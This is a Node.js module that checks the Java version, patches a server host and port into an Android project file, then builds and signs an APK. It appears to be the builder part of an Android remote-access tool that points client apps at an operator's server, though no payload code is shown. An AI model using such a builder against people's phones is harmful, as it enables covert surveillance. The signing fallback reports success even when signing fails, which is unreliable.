const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let line = output.split('\n').find(l => l.includes('version')) || "";
        if (line !== "") {
            let m = line.match(/version \"([^\"]+)\"/);
            let v = m ? m[1] : "";
            if (v === "") return callback(null, line);
            let parts = v.split('.');
            let major = parseInt(parts[0], 10);
            if (major === 1 && parts.length > 1) major = parseInt(parts[1], 10);
            if (!isNaN(major) && major >= 8) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, line);
            } else return callback("Wrong Java Version Installed. Detected " + line + ". Requires Java >= 8", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 25565) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    }
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else {
                    if (!fs.existsSync(CONST.keystorePath)) {
                        let gen = 'keytool -genkeypair -v -keystore "' + CONST.keystorePath + '" -storepass "' + CONST.keystorePass + '" -keypass "' + CONST.keystorePass + '" -alias "' + CONST.keystoreAlias + '" -dname "CN=Android,O=Android,C=US" -keyalg RSA -keysize 2048 -validity 10000';
                        cp.exec(gen, (ge) => {
                            if (ge) return fs.copyFile(CONST.apkBuildPath, CONST.apkSignedBuildPath, () => cb(false));
                            let sign = 'jarsigner -verbose -keystore "' + CONST.keystorePath + '" -storepass "' + CONST.keystorePass + '" -keypass "' + CONST.keystorePass + '" "' + CONST.apkBuildPath + '" "' + CONST.keystoreAlias + '"';
                            cp.exec(sign, (se) => {
                                if (!se) return fs.copyFile(CONST.apkBuildPath, CONST.apkSignedBuildPath, () => cb(false));
                                else return fs.copyFile(CONST.apkBuildPath, CONST.apkSignedBuildPath, () => cb(false));
                            });
                        });
                    } else {
                        let sign = 'jarsigner -verbose -keystore "' + CONST.keystorePath + '" -storepass "' + CONST.keystorePass + '" -keypass "' + CONST.keystorePass + '" "' + CONST.apkBuildPath + '" "' + CONST.keystoreAlias + '"';
                        cp.exec(sign, (se) => {
                            if (!se) return fs.copyFile(CONST.apkBuildPath, CONST.apkSignedBuildPath, () => cb(false));
                            else return fs.copyFile(CONST.apkBuildPath, CONST.apkSignedBuildPath, () => cb(false));
                        });
                    }
                }
            });
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
